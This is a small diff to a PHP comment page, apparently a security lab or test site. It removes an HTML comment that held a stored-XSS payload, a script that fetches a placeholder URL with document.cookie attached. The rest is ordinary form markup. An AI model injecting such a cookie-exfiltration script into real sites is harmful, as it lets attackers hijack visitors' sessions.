@@ -68,9 +68,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <body>
     <h1>Comment page</h1>
 
-    <!-- Comment for xss with webhook: <script> fetch('URL/?c='+document.cookie)
-        </script> -->
-
     <form method="post" action="index.php">
         <label for="name">Name:</label>
         <input type="text" id="name" name="name" pattern="^[a-zA-Z0-9 ]+$" required>
